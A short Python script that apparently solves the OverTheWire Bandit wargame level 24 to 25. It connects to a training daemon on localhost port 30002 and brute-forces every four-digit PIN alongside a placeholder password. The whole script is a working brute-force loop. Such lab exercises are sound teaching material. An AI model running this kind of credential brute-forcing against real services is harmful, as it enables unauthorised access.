#!/usr/bin/python 

##################
# Noah Chanin
# 2016-AUG-29
# Solve Bandit24 faster
# Runtime is about 10 seconds to answer
#
# http://overthewire.org/wargames/bandit/bandit25.html
# A daemon is listening on port 30002 
# and will give you the password for bandit25
# if given the password for bandit24
# and a secret numeric 4-digit pincode.
# There is no way to retrieve the pincode
# except by going through all of the 10000 combinations,
# called brute-forcing.
##################

import socket
import itertools

##################
def recvall(sock):
    data = ""
    part = ""
    rv_len = 1
    while rv_len:
        part = sock.recv(1422)
        rv_len = len(part)
        data += part
        if (rv_len < 1422):
            break
    return data

##################
s = socket.socket()
host = "localhost"
port = 30002

s.connect((host, port))
print recvall(s)

n = range(0, 10)
for i, j, k, l in itertools.product(n, n, n, n):
    pin = "BANDIT24PASS %s%s%s%s" % (i, j, k, l)
    print(pin)
    s.send("%s\n" % pin)
    rv = recvall(s)
    # don't bother checking- pinchecker dumps connection when answer is found
    print rv
s.close